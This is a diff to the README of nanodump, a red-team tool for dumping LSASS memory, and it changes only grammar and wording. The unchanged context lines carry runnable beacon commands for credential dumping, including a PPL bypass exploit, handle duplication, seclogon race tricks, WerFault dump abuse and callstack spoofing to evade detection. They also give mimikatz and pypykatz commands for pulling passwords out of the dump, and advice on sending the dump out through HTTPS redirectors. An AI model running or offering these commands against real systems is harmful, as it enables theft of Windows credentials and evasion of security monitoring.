@@ -9,9 +9,9 @@ A flexible tool that creates a minidump of the LSASS process.
 <ol>
   <li><a href="#usage">Usage</a></li>
   <li><a href="#features">Features</a></li>
-  <li><a href="#combinations">Combining techniques</a></li>
+  <li><a href="#combinations">Combining Techniques</a></li>
   <li><a href="#examples">Examples</a></li>
-  <li><a href="#redirectors">HTTPS redirectors</a></li>
+  <li><a href="#redirectors">HTTPS Redirectors</a></li>
 </ol>
 
 <h2 id="usage">1. Usage</h2>
@@ -104,7 +104,7 @@ mimikatz.exe "sekurlsa::minidump <dumpfile>" "sekurlsa::logonPasswords full" exi
 ```
 
 <b>pypykatz:</b>  
-If you prefer to stay on linux, you can use the python3 port of mimikatz called [pypykatz](https://github.com/skelsec/pypykatz).  
+If you prefer to stay on linux, you can use the python3 port of mimikatz called [pypykatz](https://github.com/skelsec/pypykatz):  
 ```sh
 python3 -m pypykatz lsa minidump <dumpfie>
 ```
@@ -125,11 +125,11 @@ This will make nanodump create a handle to LSASS with `PROCESS_CREATE_PROCESS` a
 
 As opening a handle to LSASS can be detected, nanodump can instead search for existing handles to LSASS.  
 If one is found, it will copy it and use it to create the minidump.  
-Note that it is not guaranteed to find such handle.
+Note that it is not guaranteed to find such a handle.
 
 <h3>Elevate handle</h2>
 
-You can obtaina handle to LSASS with PROCESS_QUERY_LIMITED_INFORMATION, which is likely to be whitelisted, and then elevate that handle by duplicating it.
+You can obtain a handle to LSASS with PROCESS_QUERY_LIMITED_INFORMATION, which is likely to be whitelisted, and then elevate that handle by duplicating it.
 
 <h3>Seclogon handle leak local</h2>
 
@@ -144,7 +144,7 @@ Use the `--seclogon-leak-remote` flag to access this functionality.
 
 <h3>Seclogon handle duplication</h2>
 
-You can trick the seclogon process to open a handle to LSASS and duplicate it before it is closed, by winning a race condition using file locks.
+You can trick the seclogon process into opening a handle to LSASS and duplicating it before it is closed, by winning a race condition using file locks.
 Use the `--seclogon-duplicate` flag to access this functionality.
 
 <h3>Load nanodump as an SSP</h2>
@@ -185,13 +185,13 @@ beacon> nanodump_ppl_medic -v -w C:\Windows\Temp\lsass.dmp
 ```
 
 <h3>WerFault</h2>
-You can force the WerFault.exe process to create a full memory dump of LSASS. Take into consideration that this requires to write to the registry
+You can force the WerFault.exe process to create a full memory dump of LSASS. Take into consideration that this requires the ability to write to the registry
 
 Because the dump is not made by nanodump, it will always have a valid signature.
 
 <h4>Silent Process Exit</h3>
 
-To leverage the Silent Process Exit technique, use the `--silent-process-exit` parameter and the path there the dump should be created.
+To leverage the Silent Process Exit technique, use the `--silent-process-exit` parameter and the path where the dump should be created.
 ```
 beacon> nanodump --silent-process-exit C:\Windows\Temp\
 ```
@@ -210,7 +210,7 @@ Mode                 LastWriteTime         Length Name
 
 <h4>Shtinkering</h3>
 
-You can also use the Shtinkering technique, which requires nanodump to run under SYSTEM.
+You can also use the Shtinkering technique, which requires nanodump to run under SYSTEM:
 ```
 beacon> nanodump --shtinkering
 ```
@@ -219,7 +219,7 @@ The dump will tipically be created under `C:\Windows\system32\config\systemprofi
 
 <h3>Spoof the callstack</h2>
 
-You can open a handle to LSASS with a fake callstack, this makes the function call look a bit more legitimate (especially if run as BOF).  
+You can open a handle to LSASS with a fake callstack to make the function call look a bit more legitimate (especially if run as BOF).  
 To access this feature, use the paramter `--spoof-callstack`.  
 
 <h2 id="combinations">3. Combining techniques</h2>
@@ -253,7 +253,7 @@ Read LSASS indirectly by creating a fork and write the dump to disk with an inva
 beacon> nanodump --fork --write C:\lsass.dmp
 ```
 
-Use the seclogon leak remote to leak an LSASS handle in a notepad process, duplicate that handle to get access to LSASS, then read it indirectly by creating a fork and download the dump  with a valid signature:
+Use the seclogon leak remote to leak an LSASS handle in a notepad process, duplicate that handle to get access to LSASS, then read it indirectly by creating a fork and downloading the dump with a valid signature:
 ```
 beacon> nanodump --seclogon-leak-remote C:\Windows\notepad.exe --fork --valid
 ```
@@ -299,7 +299,7 @@ Dump LSASS bypassing PPL using the PPLMedic exploit, opening a low privileged ha
 beacon> nanodump_ppl_medic --elevate-handle --write C:\Windows\Temp\lsass.dmp
 ```
 
-Trick seclogon to open a handle to LSASS and duplicate it, then download the dump with an invalid signature:
+Trick seclogon into opening a handle to LSASS and duplicate it, then download the dump with an invalid signature:
 ```
 beacon> nanodump --seclogon-duplicate
 ```
@@ -309,7 +309,7 @@ Make the WerFault.exe process create a full memory dump in the Temp folder:
 beacon> nanodump --werfault C:\Windows\Temp\
 ```
 
-Open a handle to LSASS with an spoofed callstack and download the minidump with an invalid signature:
+Open a handle to LSASS with a spoofed callstack and download the minidump with an invalid signature:
 ```
 beacon> nanodump --spoof-callstack
 ```
@@ -341,7 +341,7 @@ beacon> nanodump --duplicate-elevate
 
 <h2 id="redirectors">5. HTTPS redirectors</h2>
 
-If you are using an HTTPS redirector (as you should), you might run into issues when downloading the dump filessly due to the size of the requests that leak the dump.  
+If you are using an HTTPS redirector (as you should), you might run into issues when downloading the dump filelessly due to the size of the requests that leak the dump.  
 Increase the max size of requests on your web server to allow nanodump to download the dump.
 
 #### NGINX
